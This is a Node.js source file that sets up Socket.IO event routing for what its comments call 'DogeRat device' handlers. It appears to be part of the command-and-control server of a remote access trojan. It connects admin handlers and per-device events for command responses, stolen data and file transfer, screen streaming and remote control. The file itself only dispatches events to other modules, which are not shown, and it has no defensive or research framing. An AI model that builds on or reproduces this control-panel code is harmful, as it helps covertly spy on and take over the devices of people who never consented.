// Socket.IO setup and initialization
const { setupAdminHandlers } = require('./adminHandlers');
const { handleConnection, handleDisconnection } = require('./connectionHandler');
const { handleData, handleCommandResponse, handleMessage, handleFile } = require('./dataHandlers');
const { handleSocketError, handleSocketDisconnect } = require('./errorHandler');
const { setupReconnectionHandling } = require('./reconnectionHandler');
const { setupScreenStreamHandlers } = require('./screenStreamHandler');
const { setupRemoteControlHandlers } = require('./remoteControlHandler');

/**
 * Initialize Socket.IO handlers
 * @param {Object} io - Socket.IO server instance
 */
function initializeSockets(io) {
  // Setup admin handlers
  setupAdminHandlers(io);

  // Setup DogeRat device handlers
  io.on('connection', (socket) => {
    handleConnection(socket, io);
    
    socket.on('data', (data) => handleData(socket, data));
    socket.on('command_response', (response) => handleCommandResponse(socket, response));
    socket.on('message', (message) => handleMessage(socket, message));
    socket.on('file', (file) => handleFile(socket, file));
    
    socket.on('error', (error) => handleSocketError(socket, error));
    socket.on('disconnect', () => {
      handleDisconnection(socket);
      handleSocketDisconnect(socket);
    });

    setupReconnectionHandling(socket);
    setupScreenStreamHandlers(socket, io);
    setupRemoteControlHandlers(socket, io);
  });

  return io;
}

module.exports = {
  initializeSockets
};

